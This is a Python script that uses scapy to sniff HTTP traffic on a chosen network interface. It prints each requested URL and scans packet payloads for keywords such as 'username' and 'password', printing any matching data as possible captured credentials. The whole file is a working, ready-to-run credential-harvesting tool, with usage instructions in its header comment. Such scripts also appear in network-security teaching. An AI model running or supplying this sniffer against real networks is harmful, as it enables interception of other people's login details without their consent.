#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http


'''
        To run the script, follow the example listed below:
        python script.py --interface eth0
        
        To use custom keywords:
        python script.py --interface eth0 --keywords myuser mypass
        
        To use a file containing keywords (one per line):
        python script.py --interface eth0 --file keywords.txt
'''

# Default keywords for searching login info
DEFAULT_KEYWORDS = ['username', 'user', 'login', 'password', 'pass']


def get_args():
    '''
    Gets the arguments from the command line.
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True,
                        help="Specify an interface to capture packets.")
    parser.add_argument("-k", "--keywords", dest="keywords", nargs='+',
                        help="Specify keywords to search for in packet load. Separated by spaces.")
    parser.add_argument("-f", "--file", dest="file",
                        help="Specify a file containing keywords to search for in packet load.")
    options = parser.parse_args()

    # Use default keywords if none are specified
    if options.keywords is None and options.file is None:
        options.keywords = DEFAULT_KEYWORDS
    elif options.file is not None:
        with open(options.file, 'r') as f:
            options.keywords = [word.strip() for word in f.readlines()]

    return options


def sniff(interface):
    '''
    Start sniffing on the given interface, processing each sniffed packet.
    '''
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    '''
    Extract URL from the HTTP packet.
    '''
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet, keywords):
    '''
    Attempt to extract login information from packet load using given keywords.
    '''
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        if type(load) == bytes:
            load = load.decode('UTF8', 'replace')

        for keyword in keywords:
            if keyword in load:
                return load

    return None


def process_sniffed_packet(packet):
    '''
    Process a packet, extracting and printing URL and possible login info if found.
    '''
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if type(url) == bytes:
            url = url.decode('UTF8', 'replace')
        print('[+] HTTP Request >>> ' + url)

        login_info = get_login_info(packet, options.keywords)
        if login_info:
            print('\n\n[+] Possible username/password >>> ' +
                  login_info + '\n\n')


if __name__ == "__main__":
    options = get_args()
    sniff(options.interface)
